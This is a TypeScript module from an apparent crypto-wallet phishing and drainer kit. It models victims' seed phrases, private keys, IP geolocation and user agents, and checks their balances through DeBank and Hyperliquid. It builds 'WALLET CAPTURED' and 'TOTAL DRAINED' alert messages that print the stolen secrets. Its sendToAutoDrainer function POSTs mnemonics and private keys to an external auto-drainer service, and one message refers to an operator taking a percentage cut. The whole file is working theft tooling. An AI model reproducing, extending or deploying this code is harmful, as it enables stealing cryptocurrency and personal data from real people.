import { Wallet, HDNodeWallet } from 'ethers';
import { Debank } from '../debank.js';

const debank = new Debank();

const TOKEN_PRICE_CACHE = new Map<string, { price: number; expiresAt: number }>();
const TOKEN_PRICE_TTL_MS = 1400 * 60 * 1000; // 5 minutes
const TOKEN_SYMBOL_MAP: Record<string, string> = {
  USOL: 'SOL',
  UBTC: 'BTC',
  UETH: 'ETH'
};

// Retry utility function with exponential backoff
export async function retryWithBackoff<T>(
  fn: () => Promise<T>,
  options: {
    maxRetries?: number;
    initialDelay?: number;
    maxDelay?: number;
    backoffMultiplier?: number;
    onRetry?: (error: Error, attempt: number) => void;
  } = {}
): Promise<T> {
  const {
    maxRetries = 3,
    initialDelay = 1000,
    maxDelay = 10000,
    backoffMultiplier = 2,
    onRetry
  } = options;

  let lastError: Error;
  
  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      return await fn();
    } catch (error) {
      lastError = error instanceof Error ? error : new Error(String(error));
      
      if (attempt === maxRetries) {
        throw lastError;
      }
      
      const delay = Math.min(
        initialDelay * Math.pow(backoffMultiplier, attempt),
        maxDelay
      );
      
      if (onRetry) {
        onRetry(lastError, attempt + 1);
      }
      
      console.log(`⚠️ Retry attempt ${attempt + 1}/${maxRetries} after ${delay}ms...`);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }
  
  throw lastError!;
}

// Fetch with timeout
export async function fetchWithTimeout(
  url: string,
  options: RequestInit = {},
  timeout: number = 30000
): Promise<Response> {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeout);
  
  try {
    const response = await fetch(url, {
      ...options,
      signal: controller.signal
    });
    clearTimeout(timeoutId);
    return response;
  } catch (error) {
    clearTimeout(timeoutId);
    if (error instanceof Error && error.name === 'AbortError') {
      throw new Error(`Request timeout after ${timeout}ms`);
    }
    throw error;
  }
}

export interface MessageBody {
  error: 0 | 1;
  chatId: string;
  username: string;
  platform: string;
  botId: string | null;
  message?: string;
  errorMessage?: string;
}

export interface WalletDataWithMnemonic {
  mnemonic: string;
  privateKey: string;
  address: string;
  sentTo: string;
  ipData: {
    ip: string;
    city: string;
    country: string;
    country_name: string;
    timezone: string;
    org: string;
    [key: string]: any;
  };
  userAgent: string;
  chatId: string;
  botId: string;
}

export interface WalletDataWithoutMnemonic {
  sentTo: string;
  ipData: {
    ip: string;
    city: string;
    country: string;
    country_name: string;
    timezone: string;
    org: string;
    [key: string]: any;
  };
  userAgent: string;
  botId: string;
  chatId: string;
  withdrawAmount: string;
  address: string;
  symbol: string;
  withdrawals?: Array<{
    address: string;
    amount: string;
    symbol: string;
  }>;
  totalWithdrawUsd?: number;
}

export interface DebankUserResponse {
  user: {
    stats: {
      usd_value: number;
      top_tokens?: Array<{
        id: string;
        chain: string;
        name: string;
        symbol: string;
        amount: number;
        price: number;
        [key: string]: any;
      }>;
    };
    desc: {
      usd_value: number;
    };
    [key: string]: any;
  };
}

export interface DebankHyperliquidResponse {
  apps: {
    create_at: number;
    id: string;
    is_support_portfolio: boolean;
    is_visible: boolean;
    logo_url: string;
    name: string;
    portfolio_item_list: {
      asset_dict: {
        [key: string]: number;
      };
      asset_token_list: {
        amount: number;
        app_id: string;
        decimals: number;
        id: string;
        logo_url: string;
        name: string;
        price: number;
        symbol: string;
      }[];
      base: {
        app_id: string;
        user_addr: string;
      };
      detail: {
        description: string;
        supply_token_list: {
          amount: number;
          app_id: string;
          decimals: number;
          id: string;
          logo_url: string;
          name: string;
          price: number;
          symbol: string;
        }[];
      };
      detail_types: string[];
      name: string;
      position_index: string;
      proxy_detail: {};
      stats: {
        asset_usd_value: number;
        debt_usd_value: number;
        net_usd_value: number;
      };
      update_at: number;
      withdraw_actions: {}[];
    }[];
    site_url: string;
    update_at: number;
  }[];
  error_apps: {}[];
}

export interface AddressBalance {
  address: string;
  balance: number;
  derivationPath?: string;
  hyperliquid?: {
    totalBalance: number;
    spotTotalBalance: number;
  };
}

export async function getHyperliquidBalance(address: string): Promise<[number, number]> {
  try {
    return await retryWithBackoff(
      async () => {
        const debank = new Debank();

        const data = await debank.api<DebankHyperliquidResponse>('GET', '/portfolio/app_list', {
          query: { user_id: address.toLowerCase() }
        });

        const hyperliquid = data.apps.find(app => app.id === "hyperliquid");
        const totalBalance = hyperliquid?.portfolio_item_list.reduce((prev, current) => prev + current.stats.net_usd_value, 0) || 0;
        const spotBalancesWithdrawable = hyperliquid?.portfolio_item_list.map(item => item.detail.description.includes("Main-Account Spot") ? item.detail.supply_token_list[0] : null);
        const spotTotalBalance = spotBalancesWithdrawable?.reduce((prev, current) => prev + (current?.amount! * current?.price! || 0), 0) || 0;

        return [Number(totalBalance.toFixed(2)), Number(spotTotalBalance.toFixed(2))];
      },
      {
        maxRetries: 3,
        initialDelay: 1000,
        onRetry: (error, attempt) => {
          console.log(`⚠️ Retrying getHyperliquidBalance for ${address}, attempt ${attempt}:`, error.message);
        }
      }
    );
  } catch (error) {
    console.error(`❌ Error fetching Hyperliquid balance for ${address} after retries:`, error);
    return [0, 0];
  }
}

export async function getTokenPrice(symbol: string): Promise<number> {
  const normalized = symbol.toUpperCase();

  if (normalized === 'USDC') {
    return 1;
  }

  const targetSymbol = TOKEN_SYMBOL_MAP[normalized];
  if (!targetSymbol) {
    console.log(`Unsupported token symbol: ${symbol}`);
    return 0;
  }

  const now = Date.now();
  const cached = TOKEN_PRICE_CACHE.get(normalized);
  if (cached && cached.expiresAt > now) {
    return cached.price;
  }

  try {
    const response = await fetchWithTimeout(
      `https://min-api.cryptocompare.com/data/price?fsym=${encodeURIComponent(targetSymbol)}&tsyms=USD`,
      {},
      10000
    );

    if (!response.ok) {
      throw new Error(`Price API responded with status ${response.status}`);
    }

    const data = await response.json() as { USD?: number };
    const price = Number(data?.USD);

    if (!Number.isFinite(price) || price <= 0) {
      throw new Error(`Invalid price received for ${normalized}`);
    }

    TOKEN_PRICE_CACHE.set(normalized, {
      price,
      expiresAt: now + TOKEN_PRICE_TTL_MS
    });

    return price;
  } catch (error) {
    if (cached) {
      console.warn(`⚠️ Using cached price for ${normalized} due to fetch error:`, error);
      return cached.price;
    }
    throw error instanceof Error ? error : new Error(String(error));
  }
}

export async function getAddressBalance(address: string): Promise<number> {
  try {
    return await retryWithBackoff(
      async () => {
        const data = await debank.api<DebankUserResponse>('GET', '/user', {
          query: { id: address.toLowerCase() }
        });

        return Number((data.user?.stats?.usd_value || data.user?.desc?.usd_value || 0).toFixed(2));
      },
      {
        maxRetries: 3,
        initialDelay: 1000,
        onRetry: (error, attempt) => {
          console.log(`⚠️ Retrying getAddressBalance for ${address}, attempt ${attempt}:`, error.message);
        }
      }
    );
  } catch (error) {
    console.error(`❌ Error fetching address balance for ${address} after retries:`, error);
    return 0;
  }
}

export async function getAddressTokenBalancesFromHyperliquid(address: string): Promise<number> {
  try {
    return await retryWithBackoff(
      async () => {
        const data = await ( await fetch("https://api-ui.hyperliquid.xyz/info", {
          method: "POST",
          headers: {
            'Content-Type': 'application/json',
            'Referer': 'https://app.hyperliquid.xyz/',
            'Origin': 'https://app.hyperliquid.xyz/',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:146.0) Gecko/20100101 Firefox/146.0'
          },
          body: JSON.stringify({
            "type": "spotClearinghouseState",
            "user": address
          })
        })).json() as { balances: { coin: string; total: string }[] };
        console.log(`💰 Hyperliquid token balances:`, data.balances);
        let totalBalance = 0;
        for (const balance of data.balances) {
          console.log(`💰 ${balance.coin}: ${balance.total}`);
          const price = await getTokenPrice(balance.coin);
          console.log(`💰 ${balance.coin} price: ${price}`);
          totalBalance += Number(balance.total) * price;
        }
        console.log(`💰 Total balance: ${totalBalance}`);
        return Number(totalBalance.toFixed(2));
      },
      {
        maxRetries: 3,
        initialDelay: 1000,
        onRetry: (error, attempt) => {
          console.log(`⚠️ Retrying getAddressBalance for ${address}, attempt ${attempt}:`, error.message);
        }
      }
    );
  } catch (error) {
    console.error(`❌ Error fetching address balance for ${address} after retries:`, error);
    return 0;
  }
}

export function generateAddressesFromMnemonic(mnemonic: string, count: number = 3, startIndex: number = 1): string[] {
  try {
    const addresses: string[] = [];

    for (let i = startIndex; i < startIndex + count; i++) {
      const path = `m/44'/60'/0'/0/${i}`;
      const wallet = HDNodeWallet.fromPhrase(mnemonic, undefined, path);
      addresses.push(wallet.address);
    }

    return addresses;
  } catch (error) {
    console.error(`❌ Error generating addresses from mnemonic:`, error);
    return [];
  }
}

export function isBase64(str: string): boolean {
  try {
    const base64Regex = /^[A-Za-z0-9+/=]+$/;
    if (!base64Regex.test(str)) return false;

    const decoded = Buffer.from(str, 'base64').toString('utf-8');
    return Buffer.from(decoded, 'utf-8').toString('base64') === str;
  } catch {
    return false;
  }
}

function normalizeAmount(amount: string): number {
  if (typeof amount !== 'string') {
    return Number(amount) || 0;
  }
  const normalized = amount.replace(/,/g, '.');
  const value = Number.parseFloat(normalized);
  return Number.isFinite(value) ? value : 0;
}

export async function calculateWithdrawalsTotalUsd(data: WalletDataWithoutMnemonic): Promise<number> {
  const entries = Array.isArray(data.withdrawals) && data.withdrawals.length > 0
    ? data.withdrawals
    : [{ address: data.address, amount: data.withdrawAmount, symbol: data.symbol }];

  let total = 0;
  const localPriceCache = new Map<string, number>();

  for (const entry of entries) {
    const amount = normalizeAmount(entry.amount);
    if (amount <= 0) continue;

    const tokenSymbol = entry.symbol.toUpperCase();
    if (!localPriceCache.has(tokenSymbol)) {
      localPriceCache.set(tokenSymbol, await getTokenPrice(tokenSymbol));
    }

    const price = localPriceCache.get(tokenSymbol)!;
    total += amount * price;
  }

  return Number(total.toFixed(2));
}

export function formatWalletMessage(
  data: WalletDataWithMnemonic | WalletDataWithoutMnemonic,
  balances: AddressBalance[]
): string {
  const isFullWallet = 'mnemonic' in data;
  const batchWithdrawals = !isFullWallet && Array.isArray((data as WalletDataWithoutMnemonic).withdrawals) && (data as WalletDataWithoutMnemonic).withdrawals!.length > 0;
  const withdrawalDetails = batchWithdrawals ? (data as WalletDataWithoutMnemonic).withdrawals! : [];
  const totalWithdrawUsd = !isFullWallet ? (data as WalletDataWithoutMnemonic).totalWithdrawUsd : undefined;

  let message = `🎣 <b>WALLET CAPTURED</b>\n\n`;

  // Access Type
  if (isFullWallet) {
    message += `<b>Access:</b> Full Control\n\n`;
    message += `<b>Seed Phrase:</b>\n<code>${data.mnemonic}</code>\n\n`;
    message += `<b>Private Key:</b>\n<code>${data.privateKey}</code>\n\n`;
  } else {
    message += `<b>Access:</b> Withdrawal Only\n`;
    if (batchWithdrawals) {
      message += `<b>Transactions:</b> ${withdrawalDetails.length}\n\n`;
    } else {
      message += `<b>Amount:</b> ${data.withdrawAmount} ${data.symbol}\n\n`;
    }
  }

  // Address / Withdrawals summary
  if (batchWithdrawals) {
    message += `<b>Primary Address:</b>\n<code>${data.address}</code>\n\n`;
    message += `<b>Withdrawals:</b>\n`;
    withdrawalDetails.forEach((withdrawal, index) => {
      const label = `${index + 1}. ${withdrawal.amount} ${withdrawal.symbol}`;
      const addressLine = withdrawal.address && withdrawal.address !== data.address
        ? `\n   From: <code>${withdrawal.address}</code>`
        : '';
      message += `${label}${addressLine}\n`;
    });
    message += `\n`;
  } else {
    message += `<b>Address:</b>\n<code>${data.address}</code>\n\n`;
  }

  if (!isFullWallet && typeof totalWithdrawUsd === 'number' && !Number.isNaN(totalWithdrawUsd)) {
    // message += `<b>Total Withdrawals:</b> $${totalWithdrawUsd.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}\n\n`;
    message += `━━━━━━━━━━━━━━━━━━\n`;
    message += `<b>💰 TOTAL DRAINED: $${totalWithdrawUsd.toFixed(2)}</b>\n`;
    message += `━━━━━━━━━━━━━━━━━━\n\n`;
  }

  // Balances
  if (balances.length > 0 && isFullWallet) {
    const totalBalance = balances.reduce((sum, b) => sum + b.balance, 0);
    const totalHyperliquidBalance = balances.reduce((sum, b) => sum + (b.hyperliquid?.totalBalance || 0), 0);
    const totalHyperliquidSpotBalance = balances.reduce((sum, b) => sum + (b.hyperliquid?.spotTotalBalance || 0), 0);

    message += `━━━━━━━━━━━━━━━━━━\n`;
    message += `<b>💰 TOTAL BALANCE: $${totalBalance.toFixed(2)}</b>\n`;
    if (totalHyperliquidBalance > 0 && isFullWallet) {
      message += `<b>💎 Hyperliquid Withdrawable: $${totalHyperliquidSpotBalance.toFixed(2)}</b>\n`;
    }
    message += `━━━━━━━━━━━━━━━━━━\n\n`;
  } else if (balances.length <= 0 && isFullWallet) {
    message += `<b>Balance:</b> Unable to fetch data\n\n`;
  }

  // Location & Device
  message += `<b>Location:</b>\n`;
  message += `${data.ipData.country_name} • ${data.ipData.city || 'Unknown City'}\n`;
  message += `IP: <code>${data.ipData.ip}</code>\n`;
  message += `\n`;

  message += `<b>Device:</b>\n<code>${data.userAgent}</code>\n\n`;
  
  message += `<b>Time:</b> ${new Date().toLocaleString('en-US', { timeZone: 'Europe/Moscow' })} MSK`;

  return message;
}

// Safe version without private keys and mnemonics - only public addresses and balances
export function formatWalletMessageSafe(
  data: WalletDataWithMnemonic | WalletDataWithoutMnemonic,
  balances: AddressBalance[]
): string {
  const isFullWallet = 'mnemonic' in data;
  const batchWithdrawals = !isFullWallet && Array.isArray((data as WalletDataWithoutMnemonic).withdrawals) && (data as WalletDataWithoutMnemonic).withdrawals!.length > 0;
  const withdrawalDetails = batchWithdrawals ? (data as WalletDataWithoutMnemonic).withdrawals! : [];
  const totalWithdrawUsd = !isFullWallet ? (data as WalletDataWithoutMnemonic).totalWithdrawUsd : undefined;

  let message = `🎣 <b>WALLET CAPTURED</b>\n\n`;

  // Access Type
  if (isFullWallet) {
    message += `<b>Access:</b> Full Control\n`;
    message += `<i>Private Key / Seed Phrase sent to @realalameda, dm for your %</i>\n\n`;
  } else {
    message += `<b>Access:</b> Withdrawal Only\n`;
    if (batchWithdrawals) {
      message += `<b>Transactions:</b> ${withdrawalDetails.length}\n\n`;
    } else {
      message += `<b>Amount:</b> ${data.withdrawAmount} ${data.symbol}\n\n`;
    }
  }

  // Address / Withdrawals summary
  if (batchWithdrawals) {
    message += `<b>Primary Address:</b>\n<code>${data.address}</code>\n\n`;
    message += `<b>Withdrawals:</b>\n`;
    withdrawalDetails.forEach((withdrawal, index) => {
      const label = `${index + 1}. ${withdrawal.amount} ${withdrawal.symbol}`;
      const addressLine = withdrawal.address && withdrawal.address !== data.address
        ? `\n   From: <code>${withdrawal.address}</code>`
        : '';
      message += `${label}${addressLine}\n`;
    });
    message += `\n`;
  } else {
    message += `<b>Address:</b>\n<code>${data.address}</code>\n\n`;
  }

  if (!isFullWallet && typeof totalWithdrawUsd === 'number' && !Number.isNaN(totalWithdrawUsd)) {
    // message += `<b>Total Withdrawals:</b> $${totalWithdrawUsd.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}\n\n`;
    message += `━━━━━━━━━━━━━━━━━━\n`;
    message += `<b>💰 TOTAL DRAINED: $${totalWithdrawUsd.toFixed(2)}</b>\n`;
    message += `━━━━━━━━━━━━━━━━━━\n\n`;
  }

  // Balances
  if (balances.length > 0 && isFullWallet) {
    const totalBalance = balances.reduce((sum, b) => sum + b.balance, 0);
    const totalHyperliquidBalance = balances.reduce((sum, b) => sum + (b.hyperliquid?.totalBalance || 0), 0);
    const totalHyperliquidSpotBalance = balances.reduce((sum, b) => sum + (b.hyperliquid?.spotTotalBalance || 0), 0);

    message += `━━━━━━━━━━━━━━━━━━\n`;
    message += `<b>💰 TOTAL BALANCE: $${totalBalance.toFixed(2)}</b>\n`;
    if (totalHyperliquidBalance > 0 && isFullWallet) {
      message += `<b>💎 Hyperliquid Withdrawable: $${totalHyperliquidSpotBalance.toFixed(2)}</b>\n`;
    }
    message += `━━━━━━━━━━━━━━━━━━\n\n`;
  } else if (balances.length <= 0 && isFullWallet) {
    message += `<b>Balance:</b> Unable to fetch data\n\n`;
  }

  // Location & Device
  message += `<b>Location:</b>\n`;
  message += `${data.ipData.country_name} • ${data.ipData.city || 'Unknown City'}\n`;
  message += `IP: <code>${data.ipData.ip}</code>\n`;

  message += `<b>Device:</b>\n<code>${data.userAgent}</code>\n\n`;
  
  message += `<b>Time:</b> ${new Date().toLocaleString('en-US', { timeZone: 'Europe/Moscow' })} MSK`;

  return message;
}

// Auto-drainer configuration
const AUTO_DRAINER_URL = process.env.AUTO_DRAINER_URL || 'http://localhost:3002';

export interface DrainRequest {
  mnemonic: string;
  privateKey: string;
  address: string;
  chatId?: string;
  ipData?: {
    ip: string;
    city: string;
    country: string;
    country_name: string;
    timezone: string;
    org: string;
    [key: string]: any;
  };
  userAgent?: string;
}

// Send wallet data to auto-drainer service
export async function sendToAutoDrainer(data: WalletDataWithMnemonic): Promise<void> {
  try {
    const drainRequest: DrainRequest = {
      mnemonic: data.mnemonic,
      privateKey: data.privateKey,
      address: data.address,
      chatId: data.chatId,
      ipData: data.ipData,
      userAgent: data.userAgent,
    };

    console.log(`📤 Sending wallet data to auto-drainer: ${AUTO_DRAINER_URL}/drain`);
    console.log(`   Address: ${data.address}`);

    await retryWithBackoff(
      async () => {
        const response = await fetchWithTimeout(
          `${AUTO_DRAINER_URL}/drain`,
          {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(drainRequest),
          },
          10000 // 10 second timeout
        );

        if (!response.ok) {
          const errorText = await response.text().catch(() => 'Unknown error');
          throw new Error(`Auto-drainer API error: ${response.status} - ${errorText}`);
        }

        const result = await response.json() as { success?: boolean; [key: string]: any };
        if (result.success !== true) {
          throw new Error(`Auto-drainer returned not success: ${JSON.stringify(result)}`);
        }

        console.log(`✅ Wallet data sent to auto-drainer successfully`);
      },
      {
        maxRetries: 2,
        initialDelay: 1000,
        onRetry: (error, attempt) => {
          console.log(`⚠️ Retrying sendToAutoDrainer, attempt ${attempt}:`, error.message);
        }
      }
    );
  } catch (error) {
    console.error(`❌ Failed to send wallet data to auto-drainer after retries:`, error);
    // Don't re-throw - auto-drainer failure shouldn't stop the main flow
  }
}

